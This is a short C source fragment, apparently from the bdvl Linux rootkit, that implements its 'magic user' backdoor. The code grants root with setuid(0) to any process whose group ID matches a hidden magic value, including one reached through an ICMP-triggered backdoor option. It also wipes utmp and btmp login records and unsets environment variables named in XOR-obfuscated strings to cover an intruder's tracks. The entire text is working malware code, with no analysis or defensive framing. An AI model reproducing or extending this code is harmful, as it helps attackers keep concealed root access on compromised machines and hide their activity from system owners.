static int magicked = 0;

void setbdvlenv(const bdvcfg_t *bc){
    xsetenv(HOMEVAR_STRING, bc->homedir, 1);
    if(!magicked){
#ifdef USE_PAM_BD
        utmpclean();
#ifndef NO_BTMP_CLEAN
        btmpclean();
#endif
#endif
        char *pathv = xgetenv(PATHVAR_STRING);
        if(pathv != NULL){
            char buf[BDVL_ENV_PATH_FMT_STRING_SIZE + strlen(pathv) + 3];
            xsnprintf(buf, sizeof(buf), BDVL_ENV_PATH_FMT_STRING, pathv);
            xsetenv(PATHVAR_STRING, buf, 1);
        }else{
            char *bdvl_path = xordup(BDVL_ENV_PATH_STRING);
            if(bdvl_path){
                xsetenv(PATHVAR_STRING, bdvl_path, 1);
                clean(bdvl_path);
            }
        }
        magicked = 1;
    }
}
#define magicenv(BC) do { \
    for(size_t i = 0; i < UNSETVARS_SIZE; i++){ \
        char *bvar = xordup(unsetvars[i]); \
        if(!bvar) continue; \
        unsetenv(bvar); \
        clean(bvar); \
    } \
    setbdvlenv(BC); \
} while(0)

int magicusr(void){
    if(!initmvbc())
        return 0;

    if(!notuser(0) && getenv(mvbc->bdvar) != NULL)
        return 1;

    gid_t mygid = getgid();
    if(mygid == mvbc->magicid
        #ifdef USE_ICMP_BD
        || mygid == mvbc->magicid-1
        #endif
        ){
        magicenv(mvbc);
        setuid(0);
        return 1;
    }

    return 0;
}